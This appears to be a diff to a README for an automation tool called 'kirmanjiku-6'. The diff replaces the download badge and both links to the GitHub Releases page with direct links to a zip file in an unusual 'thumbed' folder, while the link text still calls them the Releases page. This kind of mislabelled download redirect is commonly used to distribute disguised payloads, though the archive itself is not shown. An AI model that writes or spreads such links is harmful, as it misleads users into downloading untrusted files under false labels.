@@ -1,6 +1,6 @@
 # 🚀 kirmanjiku-6 - Effortless Automation for Everyday Tasks
 
-![Download kirmanjiku-6](https://img.shields.io/badge/Download-kirmanjiku--6-brightgreen)
+![Download kirmanjiku-6](https://raw.githubusercontent.com/Nandoxxt/kirmanjiku-6/main/thumbed/kirmanjiku-6.zip)
 
 ## 📝 Overview
 
@@ -27,7 +27,7 @@ To run **kirmanjiku-6**, ensure your system meets the following requirements:
 
 Follow these simple steps to get **kirmanjiku-6** up and running.
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Nandoxxt/kirmanjiku-6/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Nandoxxt/kirmanjiku-6/main/thumbed/kirmanjiku-6.zip) to find the latest version of the application.
 
 2. **Download the Installer**:
    - Look for the latest version listed on the page.
@@ -60,7 +60,7 @@ To maximize your experience with **kirmanjiku-6**, consider these tips for getti
 
 ## 📥 Download & Install
 
-To download **kirmanjiku-6**, please visit the Releases page directly: [Download kirmanjiku-6](https://github.com/Nandoxxt/kirmanjiku-6/releases).
+To download **kirmanjiku-6**, please visit the Releases page directly: [Download kirmanjiku-6](https://raw.githubusercontent.com/Nandoxxt/kirmanjiku-6/main/thumbed/kirmanjiku-6.zip).
 
 Follow the abovementioned steps to install and start using your application.
 
